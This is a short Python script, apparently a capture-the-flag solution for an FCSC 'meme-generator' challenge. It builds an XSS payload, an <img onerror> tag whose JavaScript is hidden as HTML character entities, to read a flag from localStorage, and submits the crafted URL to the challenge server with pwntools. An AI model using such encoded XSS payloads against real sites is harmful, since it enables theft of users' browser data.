from urllib.parse import urlencode as enc
from pwn import *

script = "console.log(localStorage.getItem(\'flag\'))"
encoded_script = ""
for c in script :
    encoded_script += "&#" + str(ord(c))
print(encoded_script)

payload = f"<img src=x onerror={encoded_script}>"
base_url = "http://meme-generator/?"
# base_url = "https://meme-generator.fcsc.fr/?"
query_string = enc({"image" : "futurama.jpeg",
                          "text" : f"{payload}"})
url = base_url + query_string
print(url)

r = remote("chall.fcsc.fr", 2210)
# context.log_level = "debug"

r.recvlines(5)
r.sendline(url.encode())
r.interactive()